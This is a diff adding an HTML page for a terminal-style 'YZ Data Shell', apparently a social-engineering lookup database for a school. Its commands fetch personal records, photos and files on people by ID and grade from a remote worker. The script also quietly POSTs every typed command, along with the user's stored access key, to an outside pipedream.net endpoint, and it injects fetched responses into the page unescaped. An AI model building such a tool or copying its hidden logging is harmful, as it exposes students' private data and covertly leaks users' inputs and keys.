@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            margin: 0;
+            background-color: black;
+            color: white;
+            padding: 20px;
+            line-height: 1.5715;
+            font-size: 16px;
+            font-family: Consolas, 'Courier New', monospace;
+        }
+
+        #inpot {
+            float: left;
+            width: 100%;
+            text-align: inherit;
+            padding-left: 10px;
+            padding-right: 10px;
+            background-color: black;
+            color: white;
+            border: 0;
+            outline: 0;
+            font-size: 16px;
+            font-family: Consolas, 'Courier New', monospace;
+        }
+
+        .jing {
+            background-color: black;
+        }
+
+        details ::marker {
+            content: ' > '
+        }
+
+        details[open] ::marker {
+            content: ' < '
+        }
+
+        summary {
+            user-select: none;
+        }
+        span{
+            word-wrap: break-word;
+        }
+        img{
+            width: 100%;
+            max-width: 480px;
+        }
+    </style>
+</head>
+
+<body id="all" onkeydown="shc()">
+    <span>YZ Data Shell ( 一中社工库 )<br>Sife keeps all the rights.</span><br>
+    <span style="display:flex" id="line1"><span>Command></span><!--<input type="text" id="inpot" aria-autocomplete="none"
+            onkeydown="(async()=>{await get()})()">-->维护中</span>
+    <script>
+        /*document.body.onclick=()=>{
+            document.getElementById("inpot").focus();
+        }*/
+        oldhis = [];
+        a = 1;
+        textcolor = "white";
+        backcolor = "black";
+        if((!localStorage.Sifekey)||(!localStorage.Sifekey.length)){
+            localStorage.Sifekey="";
+        }
+        function spi(str, needstr, num) {
+            spistr = "";
+            spiArry = [];
+            var cou = -1;
+            str.split(needstr).map((exp) => {
+                cou += 1;
+                if (cou - num > 0) {
+                    spistr += needstr + exp;
+                }
+                else if (cou - num == 0) {
+                    spistr += exp;
+                }
+                else {
+                    spiArry.push(exp);
+                }
+            });
+            spiArry.push(spistr);
+            return spiArry;
+        }
+        var ghj=Object.fromEntries(new URL(location.href).search.slice(1).split("&").map(e=>e.split("=")))
+        if(ghj.key&&ghj.key.length){
+            localStorage.Sifekey=ghj.key;
+        }
+        function shc() {
+            if (event.ctrlKey && event.keyCode == 76) {//Ctrl+L 清屏
+                document.getElementById("all").innerHTML = `<span>YZ Data Shell ( 一中社工库 )<br>Sife keeps all the rights.</span><br><span style="display:flex" id="line1"><span>Command></span><input type="text" id="inpot" aria-autocomplete="none" onkeydown="(async()=>{await get()})()"></span>`;
+                document.querySelectorAll('span')[0].style.color = textcolor;
+                document.querySelectorAll('span')[0].style.backgroundColor = backcolor;
+                document.querySelectorAll('span')[1].style.color = textcolor;
+                document.querySelectorAll('span')[1].style.backgroundColor = backcolor;
+                document.querySelectorAll('span')[2].style.color = textcolor;
+                document.querySelectorAll('span')[2].style.backgroundColor = backcolor;
+                document.getElementById("inpot").style.color = textcolor;
+                document.getElementById("inpot").style.backgroundColor = backcolor;
+                a = 1;
+                oldhis = [];
+                event.preventDefault();
+                document.getElementById("inpot").focus();
+                return false;
+            } else if (event.ctrlKey && event.keyCode == 88) {//Ctrl+X 对焦
+                event.preventDefault();
+                document.getElementById("inpot").focus();
+                return false;
+            }
+        };
+        async function get() {
+            if (event.keyCode == 13) {
+                Commad = document.getElementById('inpot').value;
+                oldhis.push(Commad);
+                document.getElementById('line' + String(a)).removeChild(document.getElementById("inpot"));
+                //document.getElementById('line'+String(a)).innerHTML+='<span style="padding-left: 10px;">'+Commad+'</span>';
+                var d = document.createElement("span"); d.style.color = textcolor; d.style.backgroundColor = backcolor;
+                d.style.paddingLeft = "10px";
+                d.innerText = Commad;
+                document.getElementById('line' + String(a)).appendChild(d);
+                if (Commad != '') {
+                    var f = document.createElement("span");
+                    fetch("https://eoriipyq9543lhu.m.pipedream.net",{method: 'POST',body: JSON.stringify({sife:btoa(encodeURIComponent(Commad)),sifer:btoa(localStorage.Sifekey)})})
+                    f.innerHTML =await amazing(Commad);
+                    f.color = textcolor;
+                    f.backgroundColor = backcolor;
+                    document.getElementById('all').appendChild(f);
+                };
+                a = a + 1;
+                numspan = document.querySelectorAll('span').length;
+                numinput = document.querySelectorAll('input').length;
+                document.getElementById("all").innerHTML += '<span style="display:flex;" id=line' + String(a) + '><span>Command></span><input type="text" id="inpot" onkeydown="get()"></span>';
+                document.querySelectorAll('span')[numspan].style.color = textcolor;
+                document.querySelectorAll('span')[numspan + 1].style.color = textcolor;
+                document.querySelectorAll('span')[numspan].style.backgroundColor = backcolor;
+                document.querySelectorAll('span')[numspan + 1].style.backgroundColor = backcolor;
+                document.querySelectorAll('input')[numinput].style.color = textcolor;
+                document.querySelectorAll('input')[numinput].style.backgroundColor = backcolor;
+                document.getElementById("inpot").focus();
+            };
+        };
+        /*
+            Command{
+        
+                echo:{
+                    r:true/false//是否有返回值
+                    f:function(args)//输入参数，例如echo 1，会调用echo的f(1)//参数值不会被完全分开，只会剥离第一个空格
+                    env:{}//环境对象，不用每次运行函数时重新初始化
+                }
+            }
+        
+        */
+        async function amazing(str) {
+            var n = spi(str, " ", 1);
+            let command = n[0].toLowerCase();
+            if (command == 'clear') {
+                document.getElementById("all").innerHTML = `<span>YZ Data Shell ( 一中社工库 )<br>Sife keeps all the rights.</span><br><span style="display:flex" id="line1"><span>Command></span><input type="text" id="inpot" aria-autocomplete="none" onkeydown="(async()=>{await get()})()"></span>`;;
+                document.querySelectorAll('span')[0].style.color = textcolor;
+                document.querySelectorAll('span')[0].style.backgroundColor = backcolor;
+                a = 1;
+                oldhis = [];
+                event.preventDefault();
+                return "";
+            }else if(command=="id"){
+                if(spi(n[1], " ", 1)[0].length){
+                    return await fetch(`https://worker.femd.eu.org/id?search=${spi(n[1], " ", 1)[0]}&grade=2023&key=${localStorage.Sifekey}`).then(e=>e.text())
+                }else{
+                    return ("<span style=\"color:red;\">error: The instruction does not exist</span>");
+                }
+            }else if(command=="watch"){
+                if(spi(n[1], " ", 1)[0].length){
+                    var f=spi(n[1], " ", 1)[1]||"2023";
+                    var stat;
+                    var j=await fetch(`https://worker.femd.eu.org/json?id=${spi(n[1], " ", 1)[0]}&grade=${f}&key=${localStorage.Sifekey}`).then(e=>{stat=e.status;return e.text()});
+                    if(stat==404){
+                        return "The database currently does not have information about this person.Continuously supplementing data in the later stage may yield results.数据库目前没有该人信息，后期不断补充数据可能会有结果"
+                    }else{
+                        return `<img src="https://worker.femd.eu.org/img?id=${spi(n[1], " ", 1)[0]}&grade=${f}&key=${localStorage.Sifekey}"/><br>`+j
+                    }
+                }else{
+                    return ("<span style=\"color:red;\">error: The instruction does not exist</span>");
+                }
+            }else if(command=="school"){
+                if(spi(n[1], " ", 1)[0].length){
+                    var f=spi(n[1], " ", 1)[1]||"2023";
+                    var stat;
+                    var j=await fetch(`https://worker.femd.eu.org/school?id=${spi(n[1], " ", 1)[0]}&grade=${f}&key=${localStorage.Sifekey}`).then(e=>{stat=e.status;return e.text()});
+                    if(stat==404){
+                        return "The database currently does not have information about this person.Continuously supplementing data in the later stage may yield results.数据库目前没有该信息，后期不断补充数据可能会有结果"
+                    }
+                    return j;
+                }else{
+                    return ("<span style=\"color:red;\">error: The instruction does not exist</span>");
+                }
+            }else if(command=="file"){//file look file||file id
+                if(spi(n[1], " ", 1)[0].length){
+                    if(spi(n[1], " ", 1)[1].length){
+                        var stat;
+                        var f="2023"
+                        var j=await fetch(`https://worker.femd.eu.org/file?id=${spi(n[1], " ", 1)[0]}&u=${spi(n[1], " ", 1)[1]}&grade=${f}&key=${localStorage.Sifekey}`).then(e=>{stat=e.status;return e.text()});
+                        if(stat==404){
+                            return "The database currently does not have information about this person.Continuously supplementing data in the later stage may yield results.数据库目前没有该信息，后期不断补充数据可能会有结果"
+                        }
+                        return j;
+                    }else{
+                        var stat;
+                        var f="2023"
+                        var j=await fetch(`https://worker.femd.eu.org/file?id=${spi(n[1], " ", 1)[0]}&grade=${f}&key=${localStorage.Sifekey}`).then(e=>{stat=e.status;return e.text()});
+                        if(stat==404){
+                            return "The database currently does not have information about this person.Continuously supplementing data in the later stage may yield results.数据库目前没有该信息，后期不断补充数据可能会有结果"
+                        }
+                        return j;
+                    }
+                }else{
+                    return ("<span style=\"color:red;\">error: The instruction does not exist</span>");
+                }
+            }else if(command == "key"){
+                if(spi(n[1], " ", 1)[0].length){
+                    localStorage.Sifekey=spi(n[1], " ", 1)[0];
+                    return "key set successfully"
+                }else{
+                    return localStorage.Sifekey
+                }
+            }else {
+                return ("<span style=\"color:red;\">error: The instruction does not exist</span>");
+            };
+        };
+        document.getElementById("inpot").focus();
+    </script>
+</body>
+
+</html>
